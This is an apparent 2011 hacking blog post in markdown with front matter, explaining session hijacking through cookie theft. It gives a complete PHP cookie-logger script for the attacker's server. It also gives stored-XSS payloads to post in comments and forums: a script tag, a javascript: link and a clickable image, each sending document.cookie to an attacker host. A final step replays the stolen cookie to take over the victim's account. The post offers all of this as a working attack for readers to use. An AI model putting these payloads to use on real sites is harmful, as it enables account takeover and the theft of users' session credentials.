---
# http://learn.getgrav.org/content/headers
title: Session hijacking or cookie stealing using php and javascript
slug: session-hijacking-or-cookie-stealing-using-php-and-javascript
# menu: Session hijacking or cookie stealing using php and javascript
date: 13-01-2011
published: true
publish_date: 13-01-2011
# unpublish_date: 13-01-2011
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - cookies
        - hack
        - hacking
        - internet
        - passwords
        - website
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [cookies,hack,hacking,internet,passwords,website]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

In computer science, session hijacking refers to the exploitation of a valid computer session—sometimes also called a session key—to gain unauthorized access to information or services in a computer system. In particular, it is used to refer to the theft of a magic cookie used to authenticate a user to a remote server. It has particular relevance to web developers, as the HTTP cookies used to maintain a session on many web sites can be easily stolen by an attacker using an intermediary computer or with access to the saved cookies on the victim’s computer (see HTTP cookie theft).  
  
Here we show how you can hack a session using javascript and php.

What is a cookie?

A cookie known as a web cookie or http cookie is a small piece of text stored by the user browser.A cookie is sent as an header by the web server to the web browser on the client side.A cookie is static and is sent back by the browser unchanged everytime it accesses the server.  
A cookie has a expiration time that is set by the server and are deleted automatically after the expiration time.  
Cookie is used to maintain users authentication and to implement shopping cart during his navigation,possibly across multiple visits.

What can we do after stealing cookie?

Well,as we know web sites authenticate their user’s with a cookie,it can be used to hijack the victims session.The victims stolen cookie can be replaced with our cookie to hijack his session.

This is a cookie stealing script that steals the cookies of a user and store them in a text file, these cookied can later be utilised.

PHP Code:  
<?php

function GetIP()  
{  
if (getenv(“HTTP\_CLIENT\_IP”) && strcasecmp(getenv(“HTTP\_CLIENT\_IP”), “unknown”))  
$ip = getenv(“HTTP\_CLIENT\_IP”);  
else if (getenv(“HTTP\_X\_FORWARDED\_FOR”) && strcasecmp(getenv(“HTTP\_X\_FORWARDED\_FOR”), “unknown”))  
$ip = getenv(“HTTP\_X\_FORWARDED\_FOR”);  
else if (getenv(“REMOTE\_ADDR”) && strcasecmp(getenv(“REMOTE\_ADDR”), “unknown”))  
$ip = getenv(“REMOTE\_ADDR”);  
else if (isset($\_SERVER[‘REMOTE\_ADDR’]) && $\_SERVER[‘REMOTE\_ADDR’] && strcasecmp($\_SERVER[‘REMOTE\_ADDR’], “unknown”))  
$ip = $\_SERVER[‘REMOTE\_ADDR’];  
else  
$ip = “unknown”;  
return($ip);  
}

function logData()  
{  
$ipLog=”log.txt”;  
$cookie = $\_SERVER[‘QUERY\_STRING’];  
$register\_globals = (bool) ini\_get(‘register\_gobals’);  
if ($register\_globals) $ip = getenv(‘REMOTE\_ADDR’);  
else $ip = GetIP();

$rem\_port = $\_SERVER[‘REMOTE\_PORT’];  
$user\_agent = $\_SERVER[‘HTTP\_USER\_AGENT’];  
$rqst\_method = $\_SERVER[‘METHOD’];  
$rem\_host = $\_SERVER[‘REMOTE\_HOST’];  
$referer = $\_SERVER[‘HTTP\_REFERER’];  
$date=date (“l dS of F Y h:i:s A”);  
$log=fopen(“$ipLog”, “a+”);

if (preg\_match(“/bhtmb/i”, $ipLog) || preg\_match(“/bhtmlb/i”, $ipLog))  
fputs($log, “IP: $ip | PORT: $rem\_port | HOST: $rem\_host | Agent: $user\_agent | METHOD: $rqst\_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie  
“);  
else  
fputs($log, “IP: $ip | PORT: $rem\_port | HOST: $rem\_host | Agent: $user\_agent | METHOD: $rqst\_method | REF: $referer | DATE: $date | COOKIE: $cookie nn”);  
fclose($log);  
}

logData();

?>

Save the script as a cookielogger.php on your server.  
(You can get any free webhosting easily such as justfree,x10hosting etc..)

Create an empty text file log.txt in the same directory on the webserver. The hijacked/hacked cookies will be automatically stored here.

Now for the hack to work we have to inject this piece of javascript into the target’s page. This can be done by adding a link in the comments page which allows users to add hyperlinks etc. But beware some sites dont allow javascript so you gotta be lucky to try this.

The best way is to look for user interactive sites which contain comments or forums.

Post the following code which invokes or activates the cookielogger on your host.

Code:  
<script language=”Java script”>  
document.location=”http://www.yourhost.com/cookielogger.php?cookie=" + document.cookie;  
</script>

Your can also trick the victim into clicking a link that activates javascript.  
Below is the code which has to be posted.

Code:  
<a href=”java script:document.location=’http://www.yourhost.com/cookielogger.php?cookie=’+document.cookie;”>Click here!</a>

Clicking an image also can activate the script.For this purpose you can use the below code.

Code:  
<a href=”java script:document.location=’http://www.yourhost.com/cookielogger.php?cookie=’+document.cookie;”>

<img src=”URL OF THE IMAGE”/></a>

All the details like cookie,ipaddress,browser of the victim are logged in to log.txt on your hostserver

In the above codes please remove the space in between javascript.

Hijacking the Session:

Now we have cookie,what to do with this..?  
Download cookie editor mozilla plugin or you may find other plugins as well.

Go to the target site–>open cookie editor–>Replace the cookie with the stolen cookie of the victim and refresh the page.Thats it!!!you should now be in his account. Download cookie editor mozilla plugin from here : https://addons.mozilla.org/en-US/firefox/addon/573

Don’t forget to comment if you like my post.   
by [hackiteasy](http://www.hackiteasy.com/)

Go to our new site- shankee.com
